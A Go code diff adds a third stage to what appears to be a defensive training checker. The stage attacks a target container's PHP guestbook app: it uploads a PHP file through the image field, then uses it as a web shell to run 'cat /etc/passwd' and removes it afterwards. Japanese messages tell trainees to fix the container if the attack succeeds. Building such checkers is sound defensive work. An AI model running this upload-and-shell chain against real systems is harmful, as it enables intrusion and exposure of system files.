@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"gopkg.in/headzoo/surf.v1"
 	"os"
+	"strings"
 )
 
 var stage = ""
@@ -28,6 +29,8 @@ func main() {
 		err = runStage1()
 	case "2":
 		err = runStage2()
+	case "3":
+		err = runStage3()
 	default:
 		panic("Invalid stage")
 	}
@@ -106,5 +109,57 @@ func runStage2() error {
 		return nil
 	} else {
 		return fmt.Errorf("攻撃が成功しました!!!\n防衛のためにコンテナを修正してください。\n")
+	}
+}
+
+func runStage3() error {
+	bow := surf.NewBrowser()
+	err := bow.Open(target + "/app/app.php")
+	if err != nil {
+		return err
+	}
+
+	bow.Open(target + "/app/app.php")
+	loginForm, _ := bow.Form("[id='main']")
+	loginForm.Input("name", "Visitor")
+	loginForm.Input("message", "かわいい犬ですね！")
+	wd, _ := os.Getwd()
+	file, _ := os.Open(wd + "/testfile.php")
+	loginForm.File("image", "testfile.php", file)
+	if err := loginForm.Submit(); err != nil {
+		return err
+	}
+
+	err = bow.Open(target + "/app/images/testfile.php")
+	if err != nil {
+		fmt.Printf("不正なファイルのアップロードを防止しました\n")
+		return nil
+	}
+
+	if cmd, _ := bow.Form("[id='main']"); cmd != nil {
+		cmd.Input("cmd", "cat /etc/passwd")
+		if err := cmd.Submit(); err != nil {
+			fmt.Printf("不正なコマンド実行を防止しました\n")
+			return nil
+		}
+	} else {
+		fmt.Printf("不正なファイル作成を防止しました\n")
+		return nil
+	}
+
+	found := bow.Body()
+	debug("body:\n%s\n", found)
+	if strings.Contains(found, "root:x:0:0:root") {
+		if cmd, err := bow.Form("[id='main']"); cmd != nil {
+			cmd.Input("cmd", "rm -f /var/www/html/app/image/testfile.php")
+			if err := cmd.Submit(); err != nil {
+				debug("後処理の失敗: %v", err)
+			}
+		} else {
+			debug("後処理の失敗: %v", err)
+		}
+		return fmt.Errorf("攻撃が成功しました!!!\n防衛のためにコンテナを修正してください。\n")
+	} else {
+		return nil
 	}
 }
